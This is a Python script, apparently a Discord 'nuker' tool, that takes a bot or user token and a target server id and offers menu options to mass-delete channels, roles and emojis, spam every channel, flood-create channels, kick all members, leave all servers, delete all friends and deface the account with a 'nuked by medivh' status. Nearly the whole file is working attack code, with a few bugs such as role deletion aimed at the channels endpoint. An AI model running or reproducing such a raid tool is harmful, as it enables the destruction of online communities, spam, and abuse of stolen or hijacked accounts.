import requests
from threading import Thread
import pystyle
import time
import os
import random


bann = """
███╗   ███╗███████╗██████╗ ██╗██╗   ██╗██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗ ████║██╔════╝██╔══██╗██║██║   ██║██║  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔████╔██║█████╗  ██║  ██║██║██║   ██║███████║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║╚██╔╝██║██╔══╝  ██║  ██║██║╚██╗ ██╔╝██╔══██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗      >Made by Xeon
██║ ╚═╝ ██║███████╗██████╔╝██║ ╚████╔╝ ██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═══╝  ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                              
"""





#list_ = print(pystyle.Box.DoubleCube('a : delete channels   b : delete roles   c : spam all channels \d : create channel   e : kick all   f : delete emojis'))

TOken = pystyle.Write.Input('enter your token' , pystyle.Colors.cyan_to_green , interval= 0.2)

#guild1 = '1129855678031351840'
guild1 = pystyle.Write.Input('enter guid id for target server' , pystyle.Colors.cyan_to_green , interval= 0.1)




def banner():

    os.system('cls')
    #pystyle.Write.Print(bann , pystyle.Colors.cyan_to_green , interval = 0.000015)

    b = pystyle.Colorate.Vertical(pystyle.Colors.DynamicMIX((pystyle.Col.light_gray, pystyle.Col.cyan, pystyle.Col.light_green)), pystyle.Center.XCenter(bann))
    print(b)
    print('')
    print('')
    
    list_ = pystyle.Box.DoubleCube(" a : delete channels   b : delete roles   c : spam all channels  d : create channel   e : kick all   f : delete emojis ")
    list_2 = pystyle.Box.DoubleCube(" g : spam one channel   h : edit guild   i : leave from servers   j : guild template return   k : nuke user setting     ")
    list_3 = pystyle.Box.DoubleCube(" l : delete friends ")

    #list_2 = pystyle.Box.Lines
    prd = pystyle.Center.XCenter(list_)

    #list_ = pystyle.Box.DoubleCube(" a : delete channels   b : delete roles   c : spam all channels  d : create channel   e : kick all   f : delete emojis")
    pystyle.Write.Print(list_, pystyle.Colors.cyan_to_green , interval = 0.0015 )
    print('')
    print('')

    pystyle.Write.Print(list_2, pystyle.Colors.cyan_to_green , interval = 0.0015 )
    print('')
    print('')

    pystyle.Write.Print(list_3, pystyle.Colors.cyan_to_green , interval = 0.0015 )
    print('')
    print('')


    


banner()



#TOken = pystyle.Write.Print('enter your token' , pystyle.Colors.cyan_to_green , interval= 0.2)

#guild1 = '1129855678031351840'






def main():
    cj=pystyle.Write.Input('>>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)






#guild1 = '1129855678031351840'




    if cj == 'a' :
        

        def delchannel(channel_id):
            url3 = f'https://discord.com/api/v9/channels/{channel_id}'

            headers = {
                'Authorization' : f'Bot {TOken}'
            }
            r4 = requests.delete(url3 , headers=headers)
            print(r4.status_code)

            time.sleep(2)
            main()



        def findchann(guild_id):
            url2 = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
            headers = {
                'Authorization' : f'Bot {TOken}'
            }

            r2 = requests.get(url=url2 , headers=headers)

            if r2.status_code == 200:
                channels = r2.json()
                threads=[]
                for channel in channels:
            
                    channel_id = channel['id']

                    t = Thread(target=delchannel, args=(channel_id,))
                    threads.append(t)
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()


        findchann(guild1)
        





            

        









    if cj == 'b':
        def roledel(guild_id):
            url5 = f'https://discord.com/api/v9/guilds/{guild_id}/roles'

            headers = {
                'Authorization' : f'Bot {TOken}'
            }
            r5 = requests.get(url5 , headers = headers)
        
            if r5.status_code == 200 :
                roles = r5.json()
                for role in roles:
                    role_id = role['id']

                    url6 = f'https://discord.com/api/v9/channels/{role_id}'

                    r6 = requests.delete(url6 , headers=headers)

                    if r6.status_code == 200 or 204:
                        print(f"Channel {role_id} deleted successfully")
                    else:
                        print('failed')


        Thread(target=roledel , args=(guild1,))
        


        """def roledell(role_id,guild_id):
            url6 = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}'

            headers = {
                'Authorization' : f'Bot {TOken}'
            }
            r6 = requests.delete(url6 , headers=headers)
            print(r6.status_code)


        def findrole(guild_id):
            url5 = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
            headers = {
                'Authorization' : f'Bot {TOken}'
            }

            r5 = requests.get(url5 , headers = headers)
        
            if r5.status_code == 200 :
                roles = r5.json()
                threads=[]
                for role in roles:
                    role_id = role['id']

                    t = Thread(target=roledell, args=(role_id,guild1))
                    threads.append(t)
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()



        findrole(guild1)"""
        









        





    if cj == 'c':
        



        def send_message(channel_id, content, token , count):
            url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
            headers = {
            'Authorization': f'Bot {token}'
            }
            
            for v in range(count):

                response = requests.post(url, headers=headers, json={"content": content})
                print(response.status_code)

            time.sleep(2)
            main()

        def massmessall(guild_id):
            count = int(input('Enter count for message: '))
            content_ = input('Enter content: ')
            url8 = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
            headers = {
                'Authorization': f'Bot {TOken}'
            }
            r8 = requests.get(url=url8, headers=headers)
            if r8.status_code in [200,204]:
                channels = r8.json()
                threads = []
                for channel in channels:
                    channel_id = channel['id']
                    t = Thread(target=send_message, args=(channel_id, content_, TOken,count))
                    threads.append(t)
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()

            



        massmessall(guild1)

            
        




    if cj == 'd' :
        def createchannel(guild_id):
            count1 = input('enter count of the channel >>> ')
            name1 = input('enter name of the channels >>> ')


            url9 = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
            headers = {
                'Authorization' : f'Bot {TOken}' , 
                'Content-Type': 'application/json'

            }

            data = {
                'name' : f"{name1}"
            }

            threads = []

            for y in range(int(count1)):
                r = requests.post(url9 , headers=headers , json=data)
                print(r.status_code)


            time.sleep(2)
            main()

            




        #Thread(target=createchannel , args=(guild1,)).start()
        threads=[]
        t = Thread(target=createchannel, args=(guild1,))
        threads.append(t)
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()




    if cj== 'g' :
        def spamone():
            count = pystyle.Write.Input('enter count >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)
            content = pystyle.Write.Input('enter content >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)
            channel_id = pystyle.Write.Input('enter channel id >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)

            url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
            headers = {
            'Authorization': f'Bot {TOken}'
            }

            for v in range(int(count)):

                response = requests.post(url, headers=headers, json={"content": content})
                if response.status_code in [200,201,204] :
                    #ass=pystyle.Colorate.Vertical(f'sent successfully in {channel_id}' , pystyle.Colors.cyan_to_green)
                    print(f'sent successfully in {channel_id}')


            time.sleep(1)
            main()


        threads=[]
        t = Thread(target=spamone)
        threads.append(t)
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()






            



        







    if cj == 'e' :
        """def kickall(guild_id):
            url10 = f'https://discord.com/api/v9/guilds/{guild_id}/members' 

            headers = {
                'Authorization' : f'Bot {TOken}'

            }
            r10 = requests.get(url10 , headers=headers)

            if r10.status_code == 200 or 204:
                members = r10.json()
                for member in members:
                    member_id = member['id']

                    url11 = f'https://discord.com/api/v9/guilds/{guild_id}/members/{member_id}'

                    r11 = requests.delete(url11 , headers=headers)

                    if r11.status_code == 200 or 204:
                        print(f'member {member_id} kicked successfully')

                    else:
                        print(f'failed to kick member {member_id}')


            else:
                print('failed to return member id')




        Thread(target=kickall , args=(guild1,)).start()"""



        def kickall(guild_id , member_id):
            url11 = f'https://discord.com/api/v9/guilds/{guild_id}/members/{member_id}'

            headers = {
                'Authorization' : f'Bot {TOken}'

            }
            r11 = requests.delete(url11 , headers=headers)
            print(r11.status_code)

            time.sleep(1)
            main()
            


        def findmem(guild_id):
            url10 = f'https://discord.com/api/v9/guilds/{guild_id}/members' 

            headers = {
                'Authorization' : f'Bot {TOken}'

                }
            r10 = requests.get(url10 , headers=headers)

            if r10.status_code in [200,204]:
                members = r10.json()
                threads=[]
                for member in members:
                    member_id = member['user']['id']
                

                    t = Thread(target=kickall, args=(guild1,member_id))
                    threads.append(t)
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()




        findmem(guild1)
        


        











    if cj == 'f' :
        """def emojidel(guild_id) :
            url10 = f'https://discord.com/api/v9/guilds/{guild_id}/emojis'

            headers = {
                'Authorization' : f'Bot {TOken}'

            }
            r10 = requests.get(url10 , headers=headers)

            if r10.status_code == 200 or 204:
                emojis = r10.json()
                threads=[]

                for emoji in emojis:
                    emoji_id = emoji['id']

                    url11 = f'https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji_id}'

                    r11 = requests.delete(url11 , headers=headers)


                    if r11.status_code == 200 or 204:
                        print(f'emoji {emoji_id} removed successfully')

                    else:
                        print(f'failed to delete emoji {emoji_id}')


            else:
                print('failed to return emoji id')



        Thread(target=emojidel , args=(guild1,)).start()"""

        def emojidell(guild_id , emoji_id):
            url11 = f'https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji_id}'

            headers = {
                'Authorization' : f'Bot {TOken}'

            }
            r11 = requests.delete(url11 , headers=headers)
            print (r11.status_code)

            time.sleep(2)
            main()


        def emojifind(guild_id):
            url10 = f'https://discord.com/api/v9/guilds/{guild_id}/emojis'

            headers = {
                'Authorization' : f'Bot {TOken}'

            }
            r10 = requests.get(url10 , headers=headers)
            if r10.status_code == 200 or 204:
                emojis = r10.json()
                threads=[]

                for emoji in emojis:
                    emoji_id = emoji['id']
                    t = Thread(target=emojidell , args=(guild1,emoji_id))
                    threads.append(t)
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()


        emojifind(guild1)
        #time.sleep(2)
        #main()



    if cj == 'i' :
        def leaves(guild_id):
            url = f'https://discord.com/api/v9/users/@me/guilds/{guild_id}'
            headers = {
                'Authorization' : f'{TOken}'

            }
            r = requests.delete(url , headers=headers)

            if r.status_code in [200,204,201]:
                print(f'leaved from {guild_id}')

            elif r.status_code in [429]:
                print('rate limit')


            main()
                



        def findguild():
            url = f'https://discord.com/api/v9/users/@me/guilds'
            headers = {
                'Authorization' : f'{TOken}'

            }

            r = requests.get(url , headers=headers)

            if r.status_code == 200 or 204:
                guilds = r.json()
                print(guilds)
                threads=[]
                for guild in guilds:
                    guild_id = guild['id']
                    leaves(guild_id)
                    time.sleep(2)

                    '''t = Thread(target=leaves , args=(guild_id,))
                    threads.append(t)
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()'''



        findguild()


                


            







    if cj == 'h' :
        def changeguild(guild_id):
            name = pystyle.Write.Input('enter name for server >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)
            icon = pystyle.Write.Input('enter icon url >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)

            url = f'https://discord.com/api/v9/guilds/{guild_id}'

            headers = {
                'Authorization' : f'Bot {TOken}'

            }
            json = {'name' : name , 'icon' : icon}

            r = requests.patch(url , headers=headers , json=json)
            print(r.status_code)


        changeguild(guild1)




    if cj == 'j' :

        def templateclone(guild_id):
            name = pystyle.Write.Input('enter name for template >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)
            descr = pystyle.Write.Input('enter description for template >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)

            url1 = f'https://discord.com/api/v9/guilds/{guild_id}/templates'

            headers={
                'Authorization' : f'Bot {TOken}' , 
                'Content-Type': 'application/json'

            }
            jsondata = {'name' : name , 'description' : descr}

            r1 = requests.post(url1 , headers=headers , json=jsondata)
            if r1.status_code in [200,201,204]:
                temps = r1.json()
            
            #temp_code = temps["code"]
            
                temp_code = temps['code']

                pystyle.Write.Print(f' >>>   https://discord.new/{temp_code}' , pystyle.Colors.cyan_to_green , interval = 0.0015)


            time.sleep(2)
            main()
                


        templateclone(guild1)





    if cj == 'k':
        def fingacc():
            name = pystyle.Write.Input('enter name for user >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)
            avatar = pystyle.Write.Input('enter avatar url for user profile >>>' , pystyle.Colors.cyan_to_green , interval = 0.0015)

            url = f'https://discord.com/api/v9/users/@me'
            headers={
                'Authorization' : f'{TOken}' , 
                'Content-Type': 'application/json'

            }

            jsondata = {'username' : name ,
                        #'avatar' : avatar ,
                        'theme' : 'light' ,
                        'locale': random.choice(['ja' , 'ru' , 'zh-CN' , 'th' , 'ko' , 'hi']),
                        "message_display_compact":True,
                        "inline_embed_media" : True ,
                        "gif_auto_play":False,
                        "animate_emoji":False,
                        'render_embeds': False,
                        'render_reactions': False,
                        'custom_status':{'text' : 'nuked by medivh','emoji_name':'💣'}
                        }
            

            r = requests.patch(url=url , headers=headers , json=jsondata)

            print(r.status_code)
            main()

        fingacc()





    if cj == 'l':
        def delfr(friend_id):
            url=f"https://canary.discord.com/api/v8/users/@me/relationships/{friend_id}"
            headers={
                'Authorization' : f'{TOken}' 
            }

            r = requests.delete(url=url , headers=headers)

            if r.status_code in [200,201,204]:
                print(f'user {friend_id} deleted successfully')

            else:
                print('failed')


            main()


        def findfr():
            url="https://canary.discord.com/api/v8/users/@me/relationships"
            headers={
                'Authorization' : f'{TOken}' 
            }

            r = requests.get(url=url,headers=headers)

            if r.status_code in [200,201,204]:
                friends = r.json()
                for friend in friends:
                    friend_id=friend['id']
                    threads=[]

                    t = Thread(target=delfr , args=(friend_id,))
                    threads.append(t)
                for thread in threads:
                    thread.start()
                for thread in threads:
                    thread.join()



        findfr()



    




            




            

main()








    




    








    


    












            
    
    













